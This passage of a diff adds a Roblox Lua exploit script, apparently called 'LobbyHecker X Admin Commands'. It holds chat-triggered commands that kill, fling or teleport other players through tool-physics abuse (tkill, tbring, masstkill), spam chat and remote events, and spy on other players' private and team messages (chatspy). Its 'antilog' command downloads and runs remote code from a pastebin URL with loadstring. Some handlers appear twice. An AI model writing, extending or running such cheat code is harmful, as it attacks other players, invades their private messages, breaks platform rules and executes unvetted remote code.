+									LocalPlayer.CharacterAdded:Wait()
+									repeat
+										wait()
+									until LocalPlayer.Character.HumanoidRootPart and LocalPlayer.Character:FindFirstChild("Head") and LocalPlayer.Character:FindFirstChild("Torso") and LocalPlayer.Character.Torso:FindFirstChild("Neck")
+									LocalPlayer.Character.HumanoidRootPart.CFrame = CurrentCFrame
+								end
+							end
+						end
+						if cmd == "mute" then
+							local var = string.sub(msg, space + 1)
+							local target = GetPlayer(var)
+							local lplayer = LocalPlayer
+							game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
+							lplayer.Character.Animate.Disabled = true
+							wait(0.1)
+							lplayer.Character.Animate.Disabled = false
+							lplayer.Character.Humanoid.DisplayDistanceType = "None"
+							local Tool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
+							wait()
+							Tool.Parent = LocalPlayer.Character
+							LocalPlayer.Character.Humanoid:Remove()
+							local normalpos = target.Character.HumanoidRootPart.CFrame
+							Instance.new("Humanoid", LocalPlayer.Character)
+							Tool.Parent = LocalPlayer.Character
+							wait()
+							repeat
+								target.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
+								wait()
+							until Tool.Parent == LocalPlayer.Character
+							LocalPlayer.Character:BreakJoints()
+						end
+						if cmd == "antikill" then
+							game:GetService("RunService").Stepped:connect(
+							function()
+								game.Players.LocalPlayer.Character.Head.CanCollide = false
+								game.Players.LocalPlayer.Character.Torso.CanCollide = false
+								game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
+								game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
+								LocalPlayer.Character.ChildAdded:Connect(
+									function(rg)
+										if rg:IsA("Tool") then
+											rg:Destroy()
+										end
+									end
+								)
+							end
+							)
+						end
+						if cmd == "noclip" then
+							game:GetService("RunService").Stepped:connect(
+							function()
+								if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
+									game.Players.LocalPlayer.Character.Head.CanCollide = false
+									game.Players.LocalPlayer.Character.Torso.CanCollide = false
+									game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
+									game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
+								end
+							end
+							)
+						end
+						if cmd == "orbit2" then 
+							spawn(function()
+								while true do game:GetService("RunService").Stepped:Wait()
+									settings().Physics.AllowSleep = false
+									game:GetService("Players").LocalPlayer.ReplicationFocus = workspace
+									setsimulationradius(999e999 * math.huge * math.huge+1, 9999e999 * math.huge * math.huge+1)
+								end
+							end)
+
+							local rotx = 0;
+							local rotz = math.pi / 2;
+							local height = 0;
+							local heighti = 1;
+							local offset = 4;
+							local speed = 15;
+							local mode = 4;
+							local angular = Vector3.new(0, 0, 0);
+							local l = 1;
+							local plr = game.Players.LocalPlayer;
+							local chr = plr.Character;
+							local hum = chr.Humanoid;
+							local mov = {};
+							local mov2 = {};
+							local args = {
+								[1] = "Equip",
+								[2] = "Hats",
+								[3] = 4150905860
+							}
+							for i=1, 25 do 
+								game:GetService("ReplicatedStorage").Events.AvatarEditor:FireServer(unpack(args))
+							end
+							wait(1)
+							for _, v in pairs(hum:GetAccessories()) do
+								if v.Name ~= "ROBLOXCap" then 
+									if v.Name == "Boombox" then 
+										v:remove()
+									else
+										local b = v.Handle;
+										b.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
+										b.CanCollide = false;
+										b:BreakJoints();
+										local still = Instance.new('BodyAngularVelocity', b);
+										still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
+										still.AngularVelocity = Vector3.new(0, 0, 0);
+										local align = Instance.new('AlignPosition', b);
+										align.MaxForce = 1000000;
+										align.MaxVelocity = math.huge;
+										align.RigidityEnabled = false;
+										align.ApplyAtCenterOfMass = true;
+										align.Responsiveness = 200;
+										local a0 = Instance.new('Attachment', b);
+										local a1 = Instance.new('Attachment', chr.Torso);
+										align.Attachment0 = a0;
+										align.Attachment1 = a1;
+										table.insert(mov, a1);
+										table.insert(mov2, still);
+									end
+								end
+							end
+							local par = {};
+							for _, v in pairs(mov) do
+								local parr = Instance.new('Part', workspace);
+								parr.Anchored = true;
+								parr.Size = Vector3.new(1, 1, 1);
+								parr.Transparency = 1;
+								parr.CanCollide = false;
+								table.insert(par, parr);
+							end
+
+							local rotx = 0;
+							local rotz = math.pi / -2;
+							local height = 0;
+							local heighti = 1;
+							local offset = 5;
+							local speed = 15;
+							local mode = 4;
+							local angular = Vector3.new(10, 0, 0);
+							local l = 1;
+							game['Run Service'].RenderStepped:Connect(function()
+								rotx = rotx + speed / 100;
+								rotz = rotz + speed / 100;
+								l = (l >= 360 and 1 or l + speed);
+								for i, v in pairs(par) do
+									v.CFrame = CFrame.new(chr.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (100 / #par) * i + speed), 10000) * CFrame.new(offset, 0, 0);
+								end
+								for i, v in pairs(mov) do
+									v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
+								end
+							end)
+						end
+						if cmd == "rhats" then 
+							-- Script generated by SimpleSpy - credits to exx#9394
+
+							local args = {
+								[1] = "ResetHats"
+							}
+
+							game:GetService("ReplicatedStorage").Events.AvatarEditor:FireServer(unpack(args))
+
+						end
+						if cmd == "orbit" then 
+							spawn(function()
+								while true do game:GetService("RunService").Stepped:Wait()
+									settings().Physics.AllowSleep = false
+									game:GetService("Players").LocalPlayer.ReplicationFocus = workspace
+									setsimulationradius(999e999 * math.huge * math.huge+1, 9999e999 * math.huge * math.huge+1)
+								end
+							end)
+
+							local rotx = 0;
+							local rotz = math.pi / 2;
+							local height = 0;
+							local heighti = 1;
+							local offset = 4;
+							local speed = 15;
+							local mode = 4;
+							local angular = Vector3.new(10, 10, 0);
+							local l = 1;
+							local plr = game.Players.LocalPlayer;
+							local chr = plr.Character;
+							local hum = chr.Humanoid;
+							local mov = {};
+							local mov2 = {};
+							local args = {
+								[1] = "Equip",
+								[2] = "Hats",
+								[3] = 4150905860
+							}
+							for i=1, 20 do 
+								game:GetService("ReplicatedStorage").Events.AvatarEditor:FireServer(unpack(args))
+							end
+							wait(1)
+							for _, v in pairs(hum:GetAccessories()) do
+								if v.Name ~= "ROBLOXCap" then 
+									if v.Name == "Boombox" then 
+										v:remove()
+									else
+										local b = v.Handle;
+										b.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
+										b.CanCollide = false;
+										b:BreakJoints();
+										local still = Instance.new('BodyAngularVelocity', b);
+										still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
+										still.AngularVelocity = Vector3.new(0, 0, 0);
+										local align = Instance.new('AlignPosition', b);
+										align.MaxForce = 1000000;
+										align.MaxVelocity = math.huge;
+										align.RigidityEnabled = false;
+										align.ApplyAtCenterOfMass = true;
+										align.Responsiveness = 200;
+										local a0 = Instance.new('Attachment', b);
+										local a1 = Instance.new('Attachment', chr.Torso);
+										align.Attachment0 = a0;
+										align.Attachment1 = a1;
+										table.insert(mov, a1);
+										table.insert(mov2, still);
+									end
+								end
+							end
+							local par = {};
+							for _, v in pairs(mov) do
+								local parr = Instance.new('Part', workspace);
+								parr.Anchored = true;
+								parr.Size = Vector3.new(1, 1, 1);
+								parr.Transparency = 1;
+								parr.CanCollide = false;
+								table.insert(par, parr);
+							end
+
+							local rotx = 0;
+							local rotz = math.pi / 2;
+							local height = 0;
+							local heighti = 1;
+							local offset = 5;
+							local speed = 15;
+							local mode = 4;
+							local angular = Vector3.new(10, 10, 0);
+							local l = 1;
+							game['Run Service'].RenderStepped:Connect(function()
+								rotx = rotx + speed / 100;
+								rotz = rotz + speed / 100;
+								l = (l >= 360 and 1 or l + speed);
+								for i, v in pairs(par) do
+									v.CFrame = CFrame.new(chr.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 0) * CFrame.new(offset, 0, 0);
+								end
+								for i, v in pairs(mov) do
+									v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
+								end
+							end)
+						end
+						if cmd == "mute" then 
+							local var = string.sub(msg,space+1)
+							local target = GetPlayer(var)
+							local lplayer = LocalPlayer
+							game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
+							lplayer.Character.Animate.Disabled = true
+							wait(0.1)
+							lplayer.Character.Animate.Disabled = false
+							lplayer.Character.Humanoid.DisplayDistanceType = "None"
+							local Tool = game:GetService("Players").LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
+							wait()
+							Tool.Parent = LocalPlayer.Character
+							LocalPlayer.Character.Humanoid:Remove()
+							local normalpos = target.Character.HumanoidRootPart.CFrame 
+							Instance.new("Humanoid", LocalPlayer.Character)
+							Tool.Parent = LocalPlayer.Character
+							wait();
+							repeat 
+								target.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
+								wait()
+							until Tool.Parent == LocalPlayer.Character
+							LocalPlayer.Character:BreakJoints()
+						end
+						if cmd == "antikill" then 
+							game:GetService('RunService').Stepped:connect(function()
+
+								game.Players.LocalPlayer.Character.Head.CanCollide = false
+								game.Players.LocalPlayer.Character.Torso.CanCollide = false
+								game.Players.LocalPlayer.Character["Left Leg"].CanCollide = false
+								game.Players.LocalPlayer.Character["Right Leg"].CanCollide = false
+								LocalPlayer.Character.ChildAdded:Connect(function(rg)
+									if rg:IsA("Tool") then
+										rg:Destroy()
+									end
+								end)
+							end)
+						end
+						if cmd == "secretplace" then
+							LocalPlayer.Character.Humanoid.Jump = true
+							LocalPlayer.Character.HumanoidRootPart.CFrame =
+								CFrame.new(
+									839.187317,
+									593.225525,
+									-378.191895,
+									0.556942463,
+									0.120549589,
+									-0.821755946,
+									6.19099794e-09,
+									0.98941052,
+									0.145144105,
+									0.830551088,
+									-0.0808369219,
+									0.551044762
+								)
+						end
+						if cmd == "rj" then
+							local me = game.Players.LocalPlayer
+							local tel = game:GetService("TeleportService")
+							tel:Teleport(game.PlaceId, me)
+						end
+						if cmd == "visualizer" then 
+							spawn(function()
+								while true do game:GetService("RunService").Stepped:Wait()
+									settings().Physics.AllowSleep = false
+									game:GetService("Players").LocalPlayer.ReplicationFocus = workspace
+									setsimulationradius(999e999 * math.huge * math.huge+1, 9999e999 * math.huge * math.huge+1)
+								end
+							end)
+
+							local rotx = 0;
+							local rotz = math.pi / 2;
+							local height = 0;
+							local heighti = 1;
+							local offset = 4;
+							local speed = 15;
+							local mode = 4;
+							local angular = Vector3.new(0, 0, 0);
+							local l = 1;
+							local plr = game.Players.LocalPlayer;
+							local chr = plr.Character;
+							local hum = chr.Humanoid;
+							local mov = {};
+							local mov2 = {};
+							local args = {
+								[1] = "Equip",
+								[2] = "Hats",
+								[3] = 4546422467
+							}
+							for i=1, 20 do 
+								game:GetService("ReplicatedStorage").Events.AvatarEditor:FireServer(unpack(args))
+							end
+							wait(1)
+							for _, v in pairs(hum:GetAccessories()) do
+								if v.Name ~= "ROBLOXCap" then 
+									if v.Name == "Boombox" then 
+										v:remove()
+									else
+										local b = v.Handle;
+										b.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
+										b.CanCollide = false;
+										b:BreakJoints();
+										local still = Instance.new('BodyAngularVelocity', b);
+										still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
+										still.AngularVelocity = Vector3.new(0, 0, 0);
+										local align = Instance.new('AlignPosition', b);
+										align.MaxForce = 1000000;
+										align.MaxVelocity = math.huge;
+										align.RigidityEnabled = false;
+										align.ApplyAtCenterOfMass = true;
+										align.Responsiveness = 200;
+										local a0 = Instance.new('Attachment', b);
+										local a1 = Instance.new('Attachment', chr.Torso);
+										align.Attachment0 = a0;
+										align.Attachment1 = a1;
+										table.insert(mov, a1);
+										table.insert(mov2, still);
+									end
+								end
+							end
+							local par = {};
+							for _, v in pairs(mov) do
+								local parr = Instance.new('Part', workspace);
+								parr.Anchored = true;
+								parr.Size = Vector3.new(1, 1, 1);
+								parr.Transparency = 1;
+								parr.CanCollide = false;
+								table.insert(par, parr);
+							end
+
+							local rotx = 0;
+							local rotz = math.pi / 2;
+							local height = 0;
+							local heighti = 1;
+							local offset = 5;
+							local speed = 15;
+							local mode = 4;
+							local angular = Vector3.new(0, 0, 0);
+							local l = 1;
+							game['Run Service'].RenderStepped:Connect(function()
+								rotx = rotx + speed / 100;
+								rotz = rotz + speed / 100;
+								l = (l >= 360 and 1 or l + speed);
+								for i, v in pairs(par) do
+									v.CFrame = CFrame.new(chr.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + speed), 9) * CFrame.new(offset, 0, 0);
+								end
+								pcall(function()
+									local so = nil;
+									for k, b in pairs(chr:GetChildren()) do
+										if b:IsA'Tool' then
+											for h, j in pairs(b:GetDescendants()) do
+												if j:IsA'Sound' then
+													so = j;
+												end
+											end
+										end
+									end
+									if so ~= nil then
+										offset = so.PlaybackLoudness / 100;
+										speed = so.PlaybackLoudness / 100;
+										angular = Vector3.new(100, 100, 0);
+									end
+								end)
+								for i, v in pairs(mov) do
+									v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
+								end
+							end)
+						end
+						if cmd == "tkill" then
+							local var = string.sub(msg, space + 1)
+							local target = GetPlayer(var)
+							local lplayer = LocalPlayer
+							game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
+							lplayer.Character.Animate.Disabled = true
+
+							lplayer.Character.Animate.Disabled = false
+							lplayer.Character.Humanoid.DisplayDistanceType = "None"
+							local Tool = LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
+							wait()
+							LocalPlayer.Character.Humanoid:Remove()
+							local normalpos = target.Character.HumanoidRootPart.CFrame
+							Instance.new("Humanoid", LocalPlayer.Character)
+							Tool.Parent = LocalPlayer.Character
+							wait()
+
+							wait(0.3)
+							target.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
+							wait()
+							LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0)
+							workspace.FallenPartsDestroyHeight = 0 / 1 / 0
+							wait(0.8)
+							LocalPlayer.Character:BreakJoints()
+						end
+						if cmd == "tbring" then
+							local var = string.sub(msg, space + 1)
+							local target = GetPlayer(var)
+							local lplayer = LocalPlayer
+							game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
+							lplayer.Character.Animate.Disabled = true
+
+							lplayer.Character.Animate.Disabled = false
+							lplayer.Character.Humanoid.DisplayDistanceType = "None"
+							local Tool = LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
+							wait()
+							local norp = lplayer.Character.HumanoidRootPart.CFrame
+							LocalPlayer.Character.Humanoid:Remove()
+							local normalpos = target.Character.HumanoidRootPart.CFrame
+							Instance.new("Humanoid", LocalPlayer.Character)
+							Tool.Parent = LocalPlayer.Character
+							wait()
+							repeat
+								target.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
+								for i = 1, 20 do
+									lplayer.Character.HumanoidRootPart.CFrame = norp
+								end
+								wait()
+							until Tool.Parent == LocalPlayer.Character
+							wait(0.3)
+							workspace.FallenPartsDestroyHeight = 0 / 1 / 0
+							LocalPlayer.Character:BreakJoints()
+						end
+
+						if cmd == "halo" then 
+							spawn(function()
+								while true do game:GetService("RunService").Stepped:Wait()
+									settings().Physics.AllowSleep = false
+									game:GetService("Players").LocalPlayer.ReplicationFocus = workspace
+									setsimulationradius(999e999 * math.huge * math.huge+1, 9999e999 * math.huge * math.huge+1)
+								end
+							end)
+
+							local rotx = 0;
+							local rotz = math.pi / 2;
+							local height = 0;
+							local heighti = 1;
+							local offset = 4;
+							local speed = 15;
+							local mode = 4;
+							local angular = Vector3.new(0, 0, 0);
+							local l = 1;
+							local plr = game.Players.LocalPlayer;
+							local chr = plr.Character;
+							local hum = chr.Humanoid;
+							local mov = {};
+							local mov2 = {};
+							local args = {
+								[1] = "Equip",
+								[2] = "Hats",
+								[3] = 4150905860
+							}
+							for i=1, 20 do 
+								game:GetService("ReplicatedStorage").Events.AvatarEditor:FireServer(unpack(args))
+							end
+							wait(1)
+							for _, v in pairs(hum:GetAccessories()) do
+								if v.Name ~= "ROBLOXCap" then 
+									if v.Name == "Boombox" then 
+										v:remove()
+									else
+										local b = v.Handle;
+										b.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0);
+										b.CanCollide = false;
+										b:BreakJoints();
+										local still = Instance.new('BodyAngularVelocity', b);
+										still.MaxTorque = Vector3.new(math.huge, math.huge, math.huge);
+										still.AngularVelocity = Vector3.new(0, 0, 0);
+										local align = Instance.new('AlignPosition', b);
+										align.MaxForce = 1000000;
+										align.MaxVelocity = math.huge;
+										align.RigidityEnabled = false;
+										align.ApplyAtCenterOfMass = true;
+										align.Responsiveness = 200;
+										local a0 = Instance.new('Attachment', b);
+										local a1 = Instance.new('Attachment', chr.Torso);
+										align.Attachment0 = a0;
+										align.Attachment1 = a1;
+										table.insert(mov, a1);
+										table.insert(mov2, still);
+									end
+								end
+							end
+							local par = {};
+							for _, v in pairs(mov) do
+								local parr = Instance.new('Part', workspace);
+								parr.Anchored = true;
+								parr.Size = Vector3.new(1, 1, 1);
+								parr.Transparency = 1;
+								parr.CanCollide = false;
+								table.insert(par, parr);
+							end
+
+							local rotx = 0;
+							local rotz = math.pi / 2;
+							local height = 0;
+							local heighti = 1;
+							local offset = 5;
+							local speed = 15;
+							local mode = 4;
+							local angular = Vector3.new(0, 0, 0);
+							local l = 1;
+							game['Run Service'].RenderStepped:Connect(function()
+								rotx = rotx + speed / 100;
+								rotz = rotz + speed / 100;
+								l = (l >= 360 and 1 or l + speed);
+								for i, v in pairs(par) do
+									v.CFrame = CFrame.new(chr.HumanoidRootPart.Position) * CFrame.fromEulerAnglesXYZ(0, math.rad(l + (360 / #par) * i + 34), -100) * CFrame.new(3, 3, 0);
+								end
+								for i, v in pairs(mov) do
+									v.Position = Vector3.new(chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).X, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Y, chr.HumanoidRootPart.CFrame:ToObjectSpace(CFrame.new(par[i].Position)).Z);
+								end
+							end)
+						end
+						if cmd == "givetool" then
+							local var = string.sub(msg, space + 1)
+							local target = GetPlayer(var)
+							local lplayer = LocalPlayer
+							game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
+							lplayer.Character.Animate.Disabled = true
+							wait(0.1)
+							lplayer.Character.Animate.Disabled = false
+							lplayer.Character.Humanoid.DisplayDistanceType = "None"
+							local Tool = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool")
+							wait()
+							LocalPlayer.Character.Humanoid:Remove()
+							local normalpos = target.Character.HumanoidRootPart.CFrame
+							Instance.new("Humanoid", LocalPlayer.Character)
+							Tool.Parent = LocalPlayer.Character
+							wait()
+							repeat
+								target.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
+								wait()
+							until Tool.Parent == LocalPlayer.Character
+							LocalPlayer.Character:BreakJoints()
+						end
+
+						if cmd == "to" then
+							local var = string.sub(msg, space + 1)
+							local target = GetPlayer(var)
+							LocalPlayer.Character.Humanoid.Jump = true
+							LocalPlayer.Character.HumanoidRootPart.CFrame =
+								target.Character.HumanoidRootPart.CFrame +
+								Vector3.new(gotoPosSide, gotoPosHead, gotoPos)
+						end
+						if cmd == "re" then
+							LocalPlayer.Character:BreakJoints()
+						end
+
+						if cmd == "dance1" then
+							PlayAnim("5937560570")
+						end
+						if cmd == "dance2" then
+							PlayAnim("5915712534")
+						end
+						if cmd == "dance3" then
+							PlayAnim("4049037604")
+						end
+						if cmd == "undance" then
+							for i, v in pairs(LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
+								v:Stop()
+							end
+						end
+
+						if cmd == "masstkill" then 
+
+							local LPlayer = game.Players.LocalPlayer 
+							for i,v in pairs(game.Players:GetChildren()) do
+								local target = v
+								NormPos = LPlayer.Character.HumanoidRootPart.CFrame
+								local char = LPlayer.Character
+								local tchar = target.Character
+								local hum = LPlayer.Character.Humanoid
+								local hrp = LPlayer.Character.HumanoidRootPart
+								local hrp2 = target.Character.HumanoidRootPart
+								local camera = workspace.CurrentCamera
+								hum.Name = "1"
+								local newHum = hum:Clone()
+								newHum.Parent = char
+								newHum.Name = "Humanoid"
+
+								hum:Destroy()
+								camera.CameraSubject = char
+								newHum.DisplayDistanceType = "None"
+
+								v = LPlayer.Backpack:FindFirstChildOfClass("Tool")
+								v.Parent = char
+								hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
+								local n = 0
+								game.RunService.RenderStepped:Wait(0)
+								n = n + 1
+								hrp.CFrame = hrp2.CFrame
+
+								hrp.CFrame = NormPos
+								hrp.CFrame = NormPos
+								camera.CameraType = Enum.CameraType.Custom
+								LocalPlayer = LPlayer
+
+								workspace.FallenPartsDestroyHeight = 0/1/0
+								wait(0.1)
+								for i=1, 20 do 
+									LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -1000000000, 0)
+								end
+
+							end
+						end
+						if cmd == "pew" then 
+							while true do 
+
+								local args = {
+									[1] = "RPName",
+									[2] = "- ━╤デ╦︻ "
+								}
+
+								game:GetService("ReplicatedStorage").NetworkEvent:FireServer(unpack(args))
+								wait(0.5)
+
+								local args = {
+									[1] = "RPName",
+									[2] = "X_X  -  - "
+								}
+
+								game:GetService("ReplicatedStorage").NetworkEvent:FireServer(unpack(args))
+								wait(0.5)
+							end
+						end
+						if cmd == "winkyname" then 
+							while true do 
+
+								local args = {
+									[1] = "RPName",
+									[2] = "-_- "
+								}
+
+								game:GetService("ReplicatedStorage").NetworkEvent:FireServer(unpack(args))
+								wait(0.5)
+
+								local args = {
+									[1] = "RPName",
+									[2] = "O_O "
+								}
+
+								game:GetService("ReplicatedStorage").NetworkEvent:FireServer(unpack(args))
+								wait(0.5)
+							end
+						end
+						if cmd == "chant" then 
+							-- Script generated by SimpleSpy - credits to exx#9394
+
+							local args = {
+								[1] = "LobbyHecker X Admin Commands",
+								[2] = "All"
+							}
+							for i=1, 6 do 
+								wait(0.5)
+								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+							end
+						end
+						if cmd == "setafk" then 
+							while true do 
+
+								local args = {
+									[1] = "RPName",
+									[2] = "AFK "
+								}
+
+								game:GetService("ReplicatedStorage").NetworkEvent:FireServer(unpack(args))
+								wait(0.5)
+
+								local args = {
+									[1] = "RPName",
+									[2] = "Busting "
+								}
+
+								game:GetService("ReplicatedStorage").NetworkEvent:FireServer(unpack(args))
+								wait(0.5)
+							end
+						end
+						if cmd == "antilog" then 
+							loadstring(game:HttpGet(('https://pastebin.com/raw/J0BHhzx1'),true))()
+						end
+						if cmd == "chatspy" then
+							MessageProperties = {
+								Color = Color3.fromRGB(0, 153, 255); 
+								Font = Enum.Font.SourceSansBold;
+								TextSize = 18;
+							}
+
+							local StarterGui = game:GetService("StarterGui")
+							local Players = game:GetService("Players")
+							local LocalPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+							local GetMessage = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+
+							PlayerMessageLogs = {}
+
+							local function onChatted(Player, Message)
+								local HiddenMessage = true
+
+								local CheckMessageHidden = GetMessage.OnClientEvent:Connect(function(Packet, Channel)
+									if Packet.SpeakerUserId == Player.UserId and (Channel == "All" or (Channel == "Team" and Players[Packet.FromSpeaker].Team == LocalPlayer.Team) or Channel == "To "..LocalPlayer.Name) then
+										HiddenMessage = false
+									end
+								end)
+
+								wait(1)
+
+								CheckMessageHidden:Disconnect()
+
+								if HiddenMessage then
+									if Message:sub(1, 3) == "/t " then
+										PlayerMessageLogs[Player.Name] = "Team"
+									elseif Message:sub(1, 3) == "/w " then
+										PlayerMessageLogs[Player.Name] = "To "..Message:split(" ")[2]
+									end
+								else
+									PlayerMessageLogs[Player.Name] = "All"
+								end
+
+								if PlayerMessageLogs[Player.Name] ~= "All" then
+									local PacketMessage = ""
+									local MessageWords = Message:split(" ")
+									if Message:sub(1, 1) == "/" then
+										if PlayerMessageLogs[Player.Name]:sub(1, 3) == "To " then
+											for i, v in pairs(MessageWords) do
+												if MessageWords[i + 2] then
+													PacketMessage = PacketMessage.." "..MessageWords[i + 2]
+												end
+											end
+										else
+											for i, v in pairs(MessageWords) do
+												if MessageWords[i + 1] then
+													PacketMessage = PacketMessage.." "..MessageWords[i + 1]
+												end
+											end
+										end
+									end
+									MessageProperties.Text = "{"..PlayerMessageLogs[Player.Name].."} ".."["..Player.Name.."]: "..PacketMessage:gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
+									StarterGui:SetCore("ChatMakeSystemMessage", MessageProperties)
+								end
+							end
+
+							for i, Player in pairs(Players:GetPlayers()) do
+								PlayerMessageLogs[Player.Name] = "All"
+								Player.Chatted:Connect(function(Message)
+									if Message:sub(1, 3) == "/e " and Player.Name ~= LocalPlayer.Name then
+										MessageProperties.Text = "{Emote} ".."["..Player.Name.."]: "..Message:sub(4):gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
+										StarterGui:SetCore("ChatMakeSystemMessage", MessageProperties)
+									elseif Player.Name ~= LocalPlayer.Name then
+										onChatted(Player, Message)
+									end
+								end)
+							end
+
+							Players.PlayerAdded:Connect(function(Player)
+								PlayerMessageLogs[Player.Name] = "All"
+								Player.Chatted:Connect(function(Message)
+									if Message:sub(1, 3) == "/e " and Player.Name ~= LocalPlayer.Name then
+										MessageProperties.Text = "{Emote} ".."["..Player.Name.."]: "..Message:sub(4):gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
+										StarterGui:SetCore("ChatMakeSystemMessage", MessageProperties)
+									elseif Player.Name ~= LocalPlayer.Name then
+										onChatted(Player, Message)
+									end
+								end)
+							end)
+
+							Players.PlayerRemoving:Connect(function(Player)
+								PlayerMessageLogs:remove(Player.Name)
+							end)
+						end
+						if cmd == "fly" then 
+							repeat wait() 
+							until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
+							local mouse = game.Players.LocalPlayer:GetMouse() 
+							repeat wait() until mouse
+							local plr = game.Players.LocalPlayer 
+							local torso = plr.Character.Torso 
+							local flying = true
+							local deb = true 
+							local ctrl = {f = 0, b = 0, l = 0, r = 0} 
+							local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
+							local maxspeed = 100 
+							local speed = 0 
+
+							function Fly() 
+								local bg = Instance.new("BodyGyro", torso) 
+								bg.P = 9e4 
+								bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+								bg.cframe = torso.CFrame 
+								local bv = Instance.new("BodyVelocity", torso) 
+								bv.velocity = Vector3.new(0,0.1,0) 
+								bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
+								repeat wait() 
+									plr.Character.Humanoid.PlatformStand = true 
+									if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
+										speed = speed+.5+(speed/maxspeed) 
+										if speed > maxspeed then 
+											speed = maxspeed 
+										end 
+									elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
+										speed = speed-1 
+										if speed < 0 then 
+											speed = 0 
+										end 
+									end 
+									if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
+										bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
+										lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
+									elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
+										bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
+									else 
+										bv.velocity = Vector3.new(0,0.1,0) 
+									end 
+									bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
+								until not flying 
+								ctrl = {f = 0, b = 0, l = 0, r = 0} 
+								lastctrl = {f = 0, b = 0, l = 0, r = 0} 
+								speed = 0 
+								bg:Destroy() 
+								bv:Destroy() 
+								plr.Character.Humanoid.PlatformStand = false 
+							end 
+							mouse.KeyDown:connect(function(key) 
